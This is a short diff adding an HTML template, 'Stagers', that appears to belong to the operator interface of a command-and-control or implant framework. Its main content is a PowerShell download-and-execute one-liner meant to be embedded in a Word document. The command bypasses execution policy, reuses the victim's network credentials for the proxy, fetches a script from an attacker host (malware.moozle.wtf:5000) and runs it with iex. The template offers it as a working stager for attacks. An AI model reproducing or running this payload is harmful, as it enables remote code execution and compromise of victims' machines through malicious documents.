@@ -1,0 +1,12 @@
+{% extends "ImplantMain.html" %}
+{% block main2 %}
+<div class="m-0 p-3">
+    <h4>Stagers</h4>
+    Below is an example payload to be imbedded within a Word document. This is a well know Powershell common, thus likely blocked.<hr>
+    <div>
+        <code>powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://<b>malware.moozle.wtf:5000</b>/robots.txt')|iex"</code>
+    </div>
+
+
+</div>
+{% endblock %}
